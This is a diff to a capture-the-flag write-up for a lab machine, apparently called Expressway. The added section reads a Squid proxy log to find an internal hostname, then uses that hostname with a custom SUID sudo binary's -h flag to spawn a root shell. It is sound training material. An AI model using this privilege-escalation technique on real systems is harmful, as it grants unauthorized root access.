@@ -108,10 +108,31 @@ ike@expressway:~$ which sudo
 /usr/local/bin/sudo
 ```
 
-This confirms our suspicion. The system is using a `sudo` binary from `/usr/local/bin`, which is in the `$PATH` before the standard `/usr/bin`. This is a custom, SUID root binary and almost certainly our path to root.
+The system is using a `sudo` binary from `/usr/local/bin`, which is in the `$PATH` before the standard `/usr/bin`. This is a custom, SUID root binary and almost certainly our path to root.
 
+The `proxy` group membership is our next clue. This group often has permissions related to proxy services like Squid.
 
+```
+ike@expressway:~$ ls -l /var/log/squid
+-rw-r--r-- 1 proxy proxy 4778 Jul 23 01:19 access.log.1
+```
 
+Our group membership gives us read access to `access.log.1`. Let’s examine it.
+
+```
+ike@expressway:~$ cat /var/log/squid/access.log.1
+...
+1753229688.902 0 192.168.68.50 TCP_DENIED/403 3807 GET [http://offramp.expressway.htb](http://offramp.expressway.htb) - HIER_NONE/- text/html
+...
+```
+A client tried to access an internal-only host named `offramp.expressway.htb` through the proxy.
+
+The logic suggests that the custom `sudo` binary’s policy might depend on the hostname. Sudo has a `-h` flag to specify a host to run a command on. Let’s try running a command with our custom `sudo` but telling it we are on the `offramp` host.
+
+**The Exploit Command:**
+```
+ike@expressway:/usr/bin$ /usr/local/bin/sudo -h offramp.expressway.htb ./bash
+```
 
 
 
